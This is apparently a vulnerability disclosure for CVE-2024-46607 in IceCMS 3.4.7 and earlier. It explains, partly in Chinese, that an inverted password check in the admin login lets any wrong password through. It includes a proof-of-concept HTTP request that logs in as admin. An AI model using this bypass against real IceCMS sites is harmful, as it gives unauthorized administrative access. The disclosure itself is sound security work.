[CVE-ID]
CVE-2024-46607

[PRODUCT]
icecms

[Vendor of Product]
https://github.com/Thecosy/iceCMS?tab=readme-ov-file

[VERSION]
icecms <=3.4.7

[Vulnerability Type]
Incorrect Access Control

[Description]

漏洞在UserController.java文件的loginAdmin方法中，根本原因是因为代码逻辑错误，verifyPassword返回true和false，true代表相等，false代表不相等，所以逻辑错了。
这里的判断，当密码错误时直接往下运行，且verifyPassword的实现中，直接将数据库中加密的密码和用户传入的明文密码对比，所以百分百错误，直接绕过鉴权登录







POC：使用burpsuite发送登录数据包，如下。或者直接在登录页面登录，密码随意输入。
GET /User/loginAdmin?username=admin&password=asdasdas HTTP/1.1
Host: localhost:8181
sec-ch-ua: "Chromium";v="123", "Not:A-Brand";v="8"
Accept: application/json, text/plain, */*
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:9528
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:9528/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close







> [Suggested description]
> Incorrect access control in IceCMS v3.4.7 allows attackers to
> authenticate by entering any arbitrary values as the username and
> password.
>

> [Affected Component]
> UserController.java,loginAdmin
>

> [Attack Vectors]
> Enter the back-end login page, input the correct user name, such as "admin", and then enter an incorrect password at will. Any incorrect password will be successfully authenticated and logged in.
> ------------------------------------------
>
> [Reference]
> http://icecms.com
> https://github.com/Thecosy/iceCMS?tab=readme-ov-file

Use CVE-2024-46607.
